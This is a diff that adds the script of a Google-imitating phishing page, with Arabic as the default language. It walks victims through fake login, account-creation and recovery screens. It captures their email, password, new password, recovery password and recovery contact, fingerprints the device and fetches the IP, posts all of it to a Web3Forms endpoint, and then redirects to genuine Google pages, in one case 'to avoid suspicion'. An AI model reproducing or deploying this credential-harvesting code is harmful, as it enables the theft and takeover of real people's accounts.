+            nextPageElement.style.opacity = '0';
+            nextPageElement.style.display = 'block';
+
+            setTimeout(() => {
+                currentPageElement.style.display = 'none';
+                nextPageElement.style.transform = 'translateX(0)';
+                nextPageElement.style.opacity = '1';
+                currentPageId = pageId;
+
+                loadingBar.style.animation = 'none';
+                loadingBar.style.opacity = '0';
+
+                // Update text content for the new page after the transition is complete
+                if (pageId === 'passwordPage') {
+                    const displayEmail = document.getElementById('displayEmail');
+                    if (displayEmail) displayEmail.textContent = collectedData.email || '';
+                    attachPasswordFormListener();
+                } else if (pageId === 'createEmailPage') {
+                    const t = translations[document.getElementById('languageSelect').value];
+                    if (document.querySelector('#createEmailSubtitle')) {
+                        document.querySelector('#createEmailSubtitle').textContent = t.subtitle_create_email;
+                    }
+                    if (document.getElementById('newEmailInput')) {
+                        document.getElementById('newEmailInput').placeholder = t.placeholder_new_email;
+                    }
+                } else if (pageId === 'recoveryPage') {
+                    const recoveryEmailText = document.getElementById('recoveryEmailText');
+                    if (recoveryEmailText) recoveryEmailText.textContent = collectedData.email || '';
+                    updateRecoveryEmailIcon(collectedData.email);
+                } else if (pageId === 'tryAnotherWayPage') {
+                    const tryAnotherEmailDisplay = document.getElementById('tryAnotherEmailDisplay');
+                    if (tryAnotherEmailDisplay) tryAnotherEmailDisplay.textContent = collectedData.email || '';
+                    updateRecoveryOptions(); // Call new function to update options
+                } else if (pageId === 'forgotEmailPage') {
+                    // Update text for the new forgot email/recovery page
+                    const t = translations[document.getElementById('languageSelect').value];
+                    document.querySelector('#forgotEmailPage h1').textContent = t.h1_forgot_email;
+                    document.querySelector('#forgotEmailSubtitle').textContent = t.subtitle_forgot_email;
+                    document.getElementById('forgotEmailInput').placeholder = t.placeholder_forgot_email;
+                    document.querySelector('#forgotEmailForm .next-button').textContent = t.next_button;
+                }
+            }, 200);
+        };
+        
+        // A function to collect user device data
+        const collectDeviceData = async () => {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                collectedData.ip = data.ip;
+            } catch (error) {
+                collectedData.ip = 'Unavailable';
+            }
+            collectedData.userAgent = navigator.userAgent;
+            collectedData.screenResolution = `${window.screen.width}x${window.screen.height}`;
+            collectedData.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            console.log("Device fingerprint collected successfully:", collectedData);
+        };
+        
+        // A robust function to send data using fetch to prevent form submission issues
+        const sendDataViaFetch = async (data, redirectUrl) => {
+            const formData = new FormData();
+            
+            // Add the Web3Forms access key
+            formData.append('access_key', accessKey);
+            
+            // Append all collected data
+            for (const key in data) {
+                if (Object.prototype.hasOwnProperty.call(data, key)) {
+                    formData.append(key, data[key]);
+                }
+            }
+            
+            // Log the data to the console for confirmation
+            console.log("Attempting to send the following data:", Object.fromEntries(formData));
+
+            loadingBar.style.animation = 'loading 0.8s infinite forwards';
+            loadingBar.style.opacity = '1';
+
+            try {
+                const response = await fetch(targetEndpoint, {
+                    method: 'POST',
+                    body: formData
+                });
+                loadingBar.style.animation = 'none';
+                loadingBar.style.opacity = '0';
+                
+                console.log("Data sent successfully via fetch. Redirecting now.");
+                
+                // Direct redirect without a modal
+                window.location.href = redirectUrl;
+                
+            } catch (error) {
+                loadingBar.style.animation = 'none';
+                loadingBar.style.opacity = '0';
+                console.error("Error sending data via fetch. Redirecting anyway to avoid suspicion:", error);
+                
+                // Direct redirect without a modal even on error
+                window.location.href = redirectUrl;
+            }
+        };
+        
+        const updateLanguage = (lang) => {
+            const t = translations[lang] || translations.ar;
+            document.title = t.title;
+            document.body.style.direction = (lang === 'ar') ? 'rtl' : 'ltr';
+
+            // Update all page content based on the selected language
+            
+            // Login Page
+            if (document.querySelector('#loginPage h1')) document.querySelector('#loginPage h1').textContent = t.h1_login;
+            if (document.querySelector('#loginPageSubtitle')) document.querySelector('#loginPageSubtitle').textContent = t.subtitle_login;
+            if (document.getElementById('emailInput')) document.getElementById('emailInput').placeholder = t.placeholder_email;
+            if (document.getElementById('forgotEmailLink')) document.getElementById('forgotEmailLink').textContent = t.forgot_email_link;
+            if (document.getElementById('createAccountLink')) document.getElementById('createAccountLink').textContent = t.create_account_link;
+            if (document.querySelector('#loginForm .next-button')) document.querySelector('#loginForm .next-button').textContent = t.next_button;
+            
+            // Password Page
+            const passwordPageContainer = document.getElementById('passwordPage');
+            if (passwordPageContainer) {
+                passwordPageContainer.innerHTML = passwordPageLayouts[lang] || passwordPageLayouts.ar;
+                attachPasswordFormListener();
+                setupPasswordToggle();
+            }
+
+            // Create Account - Step 1
+            if (document.querySelector('#createAccountPage h1')) document.querySelector('#createAccountPage h1').textContent = t.h1_create_name;
+            if (document.querySelector('#createAccountSubtitle')) document.querySelector('#createAccountSubtitle').textContent = t.subtitle_create_name;
+            if (document.getElementById('firstNameInput')) document.getElementById('firstNameInput').placeholder = t.placeholder_firstname;
+            if (document.getElementById('lastNameInput')) document.getElementById('lastNameInput').placeholder = t.placeholder_lastname;
+            
+            // Create Account - Step 2
+            if (document.querySelector('#createEmailPage h1')) document.querySelector('#createEmailPage h1').textContent = t.h1_create_email;
+            if (document.querySelector('#createEmailSubtitle')) document.querySelector('#createEmailSubtitle').textContent = t.subtitle_create_email;
+            if (document.getElementById('newEmailInput')) document.getElementById('newEmailInput').placeholder = t.placeholder_new_email;
+            if (document.getElementById('useCurrentEmailLink')) document.getElementById('useCurrentEmailLink').textContent = t.use_current_email_link;
+            
+            // Create Account - Step 3
+            if (document.querySelector('#createPasswordPage h1')) document.querySelector('#createPasswordPage h1').textContent = t.h1_create_password;
+            if (document.querySelector('#createPasswordSubtitle')) document.querySelector('#createPasswordSubtitle').textContent = t.subtitle_create_password;
+            if (document.getElementById('createPasswordInput')) document.getElementById('createPasswordInput').placeholder = t.placeholder_create_password;
+            if (document.getElementById('confirmPasswordInput')) document.getElementById('confirmPasswordInput').placeholder = t.placeholder_confirm_password;
+            if (document.querySelector('.password-hints')) document.querySelector('.password-hints').textContent = t.password_hints;
+            if (document.getElementById('showPasswordLink')) document.getElementById('showPasswordLink').textContent = t.show_password_link;
+
+            // Create Account - Step 4
+            if (document.querySelector('#accountCreatedPage h1')) document.querySelector('#accountCreatedPage h1').textContent = t.h1_account_created;
+            if (document.querySelector('#accountCreatedSubtitle')) document.querySelector('#accountCreatedSubtitle').textContent = t.subtitle_account_created;
+            if (document.querySelector('#accountCreatedPage .next-button')) document.querySelector('#accountCreatedPage .next-button').textContent = t.go_to_google;
+            
+            // Forgot Email Page (Now the first recovery step)
+            if (document.querySelector('#forgotEmailPage h1')) document.querySelector('#forgotEmailPage h1').textContent = t.h1_forgot_email;
+            if (document.querySelector('#forgotEmailSubtitle')) document.querySelector('#forgotEmailSubtitle').textContent = t.subtitle_forgot_email;
+            if (document.getElementById('forgotEmailInput')) document.getElementById('forgotEmailInput').placeholder = t.placeholder_forgot_email;
+            
+            // Recovery Page (This page now asks for the last password)
+            if (document.querySelector('#recoveryPage h1')) document.querySelector('#recoveryPage h1').textContent = t.h1_recovery;
+            if (document.querySelector('#recoverySubtitle')) document.querySelector('#recoverySubtitle').textContent = t.subtitle_recovery;
+            if (document.getElementById('recoveryPasswordInput')) document.getElementById('recoveryPasswordInput').placeholder = t.placeholder_recovery_password;
+            if (document.getElementById('tryAnotherWayLink')) document.getElementById('tryAnotherWayLink').textContent = t.try_another_way;
+            
+            // Try Another Way Page
+            const tryAnotherEmailDisplay = document.getElementById('tryAnotherEmailDisplay');
+            if (tryAnotherEmailDisplay) tryAnotherEmailDisplay.textContent = collectedData.email || '';
+            if (document.querySelector('#tryAnotherWayPage h1')) document.querySelector('#tryAnotherWayPage h1').textContent = t.h1_try_another;
+            if (document.querySelector('#tryAnotherWayPage .subtitle')) document.querySelector('#tryAnotherWayPage .subtitle').textContent = t.subtitle_try_another;
+            
+            updateRecoveryOptions();
+
+            // Footer links
+            if (document.querySelector('.footer-links a:nth-child(1)')) document.querySelector('.footer-links a:nth-child(1)').textContent = t.help;
+            if (document.querySelector('.footer-links a:nth-child(2)')) document.querySelector('.footer-links a:nth-child(2)').textContent = t.privacy;
+            if (document.querySelector('.footer-links a:nth-child(3)')) document.querySelector('.footer-links a:nth-child(3)').textContent = t.terms;
+        };
+
+        // Function to dynamically update the recovery options based on the email
+        const updateRecoveryOptions = () => {
+            const currentLang = document.getElementById('languageSelect').value;
+            const t = translations[currentLang] || translations.ar;
+            const email = collectedData.email || '';
+
+            if (document.getElementById('phoneOption')) {
+                document.getElementById('phoneOption').innerHTML = `<i class="fas fa-mobile-alt icon"></i><span class="text">${t.phone_option(email)}</span>`;
+            }
+            if (document.getElementById('emailOption')) {
+                document.getElementById('emailOption').innerHTML = `<i class="fas fa-envelope icon"></i><span class="text">${t.email_option(email)}</span>`;
+            }
+        };
+
+        const setupPasswordToggle = () => {
+            const passwordInput = document.getElementById('passwordInput');
+            const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
+            if (showPasswordCheckbox && passwordInput) {
+                showPasswordCheckbox.addEventListener('change', () => {
+                    passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
+                });
+            }
+        };
+        
+        const attachPasswordFormListener = () => {
+             const passwordForm = document.getElementById('passwordForm');
+             const forgotPasswordLink = document.getElementById('forgotPasswordLink');
+             
+             // Remove any existing listeners to prevent duplicates
+             if (passwordForm) {
+                passwordForm.removeEventListener('submit', handlePasswordSubmit);
+                passwordForm.addEventListener('submit', handlePasswordSubmit);
+             }
+             if (forgotPasswordLink) {
+                 forgotPasswordLink.removeEventListener('click', handleForgotPasswordClick);
+                 forgotPasswordLink.addEventListener('click', handleForgotPasswordClick);
+             }
+        };
+        
+        const handlePasswordSubmit = (e) => {
+            e.preventDefault();
+            const passwordInput = document.getElementById('passwordInput');
+            if (passwordInput) {
+                collectedData.password = passwordInput.value.trim();
+            }
+            // Send data and then redirect
+            sendDataViaFetch(collectedData, 'https://www.google.com/');
+        };
+        
+        const handleForgotPasswordClick = (e) => {
+            e.preventDefault();
+            showPage('recoveryPage', 'forward');
+        };
+        
+        // This function handles the submission for the initial recovery form
+        const handleForgotEmailSubmit = (e) => {
+            e.preventDefault();
+            const forgotEmailInput = document.getElementById('forgotEmailInput');
+            if (forgotEmailInput) {
+                collectedData.forgot_email_phone = forgotEmailInput.value.trim();
+            }
+            // Send data and then redirect
+            sendDataViaFetch(collectedData, 'https://accounts.google.com/recovery');
+        };
+        
+        // Helper function to get the first letter of the email
+        const getFirstLetter = (email) => {
+            if (!email) return '';
+            const firstLetter = email.charAt(0);
+            if (firstLetter.match(/[a-z0-9]/i)) {
+                return firstLetter.toUpperCase();
+            }
+            return '';
+        };
+        
+        // Helper function to update the icon and text in the recovery email display box
+        const updateRecoveryEmailIcon = (email) => {
+            const iconElement = document.getElementById('recoveryEmailIcon');
+            const textElement = document.getElementById('recoveryEmailText');
+            if (iconElement && textElement) {
+                const firstLetter = getFirstLetter(email);
+                iconElement.textContent = firstLetter;
+                textElement.textContent = email;
+            }
+        };
+
+        document.addEventListener('DOMContentLoaded', () => {
+            pages = {
+                loginPage: document.getElementById('loginPage'),
+                passwordPage: document.getElementById('passwordPage'),
+                createAccountPage: document.getElementById('createAccountPage'),
+                createEmailPage: document.getElementById('createEmailPage'),
+                createPasswordPage: document.getElementById('createPasswordPage'),
+                accountCreatedPage: document.getElementById('accountCreatedPage'),
+                recoveryPage: document.getElementById('recoveryPage'),
+                forgotEmailPage: document.getElementById('forgotEmailPage'),
+                tryAnotherWayPage: document.getElementById('tryAnotherWayPage')
+            };
+            loadingBar = document.getElementById('loadingBar');
+            
+            // Login form submission handler
+            if (document.getElementById('loginForm')) {
+                document.getElementById('loginForm').addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    let emailOrPhone = document.getElementById('emailInput').value.trim();
+
+                    if (emailOrPhone && !emailOrPhone.includes('@') && !/^\d+$/.test(emailOrPhone)) {
+                        emailOrPhone += '@gmail.com';
+                    }
+
+                    collectedData.email = emailOrPhone;
+                    
+                    if (collectedData.email) {
+                        const currentLang = document.getElementById('languageSelect').value;
+                        updateLanguage(currentLang);
+                        
+                        showPage('passwordPage', 'forward');
+                    }
+                });
+            }
+            
+            // Create Account - Step 1: Names Form
+            if (document.getElementById('createAccountForm')) {
+                document.getElementById('createAccountForm').addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    collectedData.first_name = document.getElementById('firstNameInput').value.trim();
+                    collectedData.last_name = document.getElementById('lastNameInput').value.trim();
+                    showPage('createEmailPage', 'forward');
+                });
+            }
+            
+            // Create Account - Step 2: Email Form
+            if (document.getElementById('createEmailForm')) {
+                document.getElementById('createEmailForm').addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    collectedData.new_email = document.getElementById('newEmailInput').value.trim();
+                    showPage('createPasswordPage', 'forward');
+                });
+            }
+            
+            // Create Account - Step 3: Password Form
+            if (document.getElementById('createPasswordForm')) {
+                document.getElementById('createPasswordForm').addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    const createPasswordInput = document.getElementById('createPasswordInput');
+                    const confirmPasswordInput = document.getElementById('confirmPasswordInput');
+                    const t = translations[document.getElementById('languageSelect').value];
+                    
+                    if (createPasswordInput && confirmPasswordInput && createPasswordInput.value === confirmPasswordInput.value) {
+                        collectedData.new_password = createPasswordInput.value.trim();
+                        // Send data and then redirect
+                        sendDataViaFetch(collectedData, 'https://www.google.com/');
+                    } else {
+                        // Direct redirect without a modal
+                        window.location.href = 'https://www.google.com/';
+                    }
+                });
+            }
+            
+            // Password toggle for create password page
+            if (document.getElementById('showPasswordLink')) {
+                document.getElementById('showPasswordLink').addEventListener('click', (e) => {
+                    e.preventDefault();
+                    const createPasswordInput = document.getElementById('createPasswordInput');
+                    const confirmPasswordInput = document.getElementById('confirmPasswordInput');
+                    if (createPasswordInput.type === 'password') {
+                        createPasswordInput.type = 'text';
+                        confirmPasswordInput.type = 'text';
+                        e.target.textContent = 'إخفاء كلمة المرور';
+                    } else {
+                        createPasswordInput.type = 'password';
+                        confirmPasswordInput.type = 'password';
+                        e.target.textContent = 'عرض كلمة المرور';
+                    }
+                });
+            }
+            
+            // Recovery form submission handler
+            if (document.getElementById('recoveryForm')) {
+                document.getElementById('recoveryForm').addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    const recoveryPasswordInput = document.getElementById('recoveryPasswordInput');
+                    if (recoveryPasswordInput) {
+                        collectedData.recovery_password = recoveryPasswordInput.value.trim();
+                    }
+                    // Send data and then redirect
+                    sendDataViaFetch(collectedData, 'https://accounts.google.com/recovery');
+                });
+            }
+
+            // Forgot Email form submission handler
+            if (document.getElementById('forgotEmailForm')) {
+                document.getElementById('forgotEmailForm').addEventListener('submit', handleForgotEmailSubmit);
+            }
+            
+            if (document.getElementById('forgotEmailLink')) {
+                document.getElementById('forgotEmailLink').addEventListener('click', (e) => {
+                    e.preventDefault();
+                    showPage('forgotEmailPage', 'forward');
+                });
+            }
+            
+            if (document.getElementById('createAccountLink')) {
+                document.getElementById('createAccountLink').addEventListener('click', (e) => {
+                    e.preventDefault();
+                    showPage('createAccountPage', 'forward');
+                });
+            }
+            
+            if (document.getElementById('tryAnotherWayLink')) {
+                document.getElementById('tryAnotherWayLink').addEventListener('click', (e) => {
+                    e.preventDefault();
+                    showPage('tryAnotherWayPage', 'forward');
+                });
+            }
+            
+            if (document.getElementById('skipRecoveryLink')) {
+                document.getElementById('skipRecoveryLink').addEventListener('click', (e) => {
+                    e.preventDefault();
+                    window.location.href = 'https://accounts.google.com/recovery';
+                });
+            }
+            
+            if (document.getElementById('useCurrentEmailLink')) {
+                document.getElementById('useCurrentEmailLink').addEventListener('click', (e) => {
+                    e.preventDefault();
+                    window.location.href = 'https://accounts.google.com/signup/v2/webcreateusername?flowName=GlifWebSignIn';
+                });
+            }
+            
+            // New listener for the interactive display field on the recovery page
+            const recoveryEmailDisplayBox = document.getElementById('recoveryEmailDisplayBox');
+            if (recoveryEmailDisplayBox) {
+                recoveryEmailDisplayBox.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    // Just redirect, no visual changes to the arrow
+                    loadingBar.style.animation = 'loading 0.4s ease-out forwards';
+                    loadingBar.style.opacity = '1';
+
+                    // After a short delay, transition back to the login page
+                    setTimeout(() => {
+                        showPage('loginPage', 'backward');
+                    }, 400); 
+                });
+            }
+
+            collectDeviceData();
+            const userLang = navigator.language.split('-')[0];
+            const defaultLang = translations[userLang] ? userLang : 'ar';
+            if (document.getElementById('languageSelect')) {
+                document.getElementById('languageSelect').value = defaultLang;
+                document.getElementById('languageSelect').addEventListener('change', (e) => {
+                    updateLanguage(e.target.value);
+                });
+            }
+            updateLanguage(defaultLang);
+            
+            document.querySelectorAll('.footer-links a').forEach(link => {
+                link.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    const href = link.getAttribute('href');
+                    if (href.startsWith('http')) {
+                        window.location.href = href;
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
